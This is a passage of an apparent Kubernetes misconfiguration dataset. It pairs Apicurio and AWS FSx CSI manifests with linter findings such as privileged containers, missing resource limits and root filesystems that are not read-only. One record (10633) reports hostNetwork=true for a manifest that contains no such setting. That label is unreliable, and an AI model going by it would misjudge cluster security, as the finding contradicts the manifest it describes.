apicurio/apicurio-studio-api:0.2.53.Final\n        name: apicurio-studio-api\n        ports:\n        - containerPort: 8080\n      volumes:\n      - name: apicurio-secret\n        secret:\n          secretName: apicurio-secret\n      - name: apicurio-configmap\n        configMap:\n          name: apicurio-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"apicurio-studio-api\" has cpu request 0"
  },
  {
    "id": "10632",
    "manifest_path": "data/manifests/the_stack_sample/sample_4104.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-api\n    app: apicurio-studio\n  name: apicurio-studio-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-api\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-api\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-db-connection-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'true'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: APICURIO_MICROCKS_API_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-api-url\n        - name: APICURIO_MICROCKS_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-client-id\n        - name: APICURIO_MICROCKS_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-microcks-client-secret\n        - name: APICURIO_KC_AUTH_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_KC_REALM\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-realm\n        - name: APICURIO_KC_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-client-id\n        - name: APICURIO_UI_HUB_UI_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-hub-ui-url\n        - name: APICURIO_KC_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-kc-client-secret\n        - name: APICURIO_SHARE_FOR_EVERYONE\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-feature-share-with-everyone\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-api:0.2.53.Final\n        name: apicurio-studio-api\n        ports:\n        - containerPort: 8080\n      volumes:\n      - name: apicurio-secret\n        secret:\n          secretName: apicurio-secret\n      - name: apicurio-configmap\n        configMap:\n          name: apicurio-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"apicurio-studio-api\" has memory limit 0"
  },
  {
    "id": "10633",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10634",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fsx-plugin\" does not have a read-only root file system"
  },
  {
    "id": "10635",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "10636",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "10637",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"fsx-csi-node-sa\" not found"
  },
  {
    "id": "10638",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"fsx-plugin\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10639",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"fsx-plugin\" is privileged"
  },
  {
    "id": "10640",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fsx-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "10641",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "10642",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        